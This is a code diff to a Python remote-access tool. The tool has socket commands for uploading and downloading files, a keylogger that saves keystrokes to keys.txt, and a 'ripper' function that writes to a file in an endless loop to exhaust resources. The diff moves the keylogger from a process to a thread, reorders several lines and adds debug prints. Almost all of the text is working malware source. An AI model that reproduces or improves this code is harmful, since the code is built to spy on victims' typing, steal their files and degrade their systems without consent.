@@ -53,7 +53,7 @@ def ripper():
 
 
 
-    with open(corruptedText,"w") as f:
+    with open(corruptedText + corruptedText,"w") as f:
         while True:       
             f.write(corruptedText)
 
@@ -298,8 +298,8 @@ def filterCommand(command):
             sendFileByteMode(command.split("-")[1])
         # UPLOAD FILES 
         elif "put-" in command:
-            filename = command.split("-")[1]
             stop = True
+            filename = command.split("-")[1]
             print(filename)
             recvFiles(filename)
         #MEMORY RIPPER    
@@ -325,20 +325,19 @@ def recvLen():
     global conn
     i = 0
     while i < 10:  
-        time.sleep(1)
         try:
             dat = conn.recv(1024)
             decoded = dat.decode()
             if "len-" in decoded:
                 return int(decoded.split("-")[1])
         except Exception as f:
-            stop = False
             print(f)
             
 
 def recvFiles(filename):
     global conn, stop
     try:
+        print("RECV LENGTH ...")
         ln = recvLen()
         print ("len : " + str(ln))
         totalRecv = 0
@@ -352,6 +351,7 @@ def recvFiles(filename):
             stop = False
     
     except Exception as e:
+        print(e)
         logEvents(e)
         stop = False 
         
@@ -386,9 +386,9 @@ def kLogger():
             if event.event_type == keyboard.KEY_DOWN:  
                 buffer += filterKey(event.name) 
                 if len(buffer) > 10:
-                
                     concatToFile(buffer, "keys.txt")
                     buffer = ""  
+            
            
                   
         except Exception as e:
@@ -411,7 +411,6 @@ def changeCurrentPath(newPath):
 def sendFileByteMode(file):
     global stop
     try:
-        stop = True
         data = readFile(file, True)
         sendLen(data)
         time.sleep(0.5)
@@ -452,8 +451,8 @@ def checkConnection():
 if __name__ == '__main__':
     thread = threading.Thread(target=checkConnection)
     thread.start()
-    keyProcess = Process(target=kLogger)
-    keyProcess.start()
+    keyThread = threading.Thread(target=kLogger)
+    keyThread.start()
     while True:
         if connected:
             time.sleep(1)
